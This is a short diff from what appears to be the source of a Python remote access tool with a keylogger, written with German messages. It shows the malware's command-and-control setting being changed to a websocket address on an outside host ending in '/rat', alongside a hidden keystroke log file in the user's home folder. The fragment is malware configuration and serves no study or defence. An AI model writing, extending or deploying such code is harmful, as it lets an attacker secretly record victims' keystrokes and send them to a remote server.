@@ -18,7 +18,7 @@ except ImportError:
     print("[!] pynput ist nicht installiert. Keylogger-Funktion nicht verfügbar.")
     keyboard = None
 
-SERVER_URI = "ws://yawning-chameleon-norobb-e4dabbb0.koyeb.app:8765"
+SERVER_URI = "ws://yawning-chameleon-norobb-e4dabbb0.koyeb.app:80/rat"
 KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
 
 
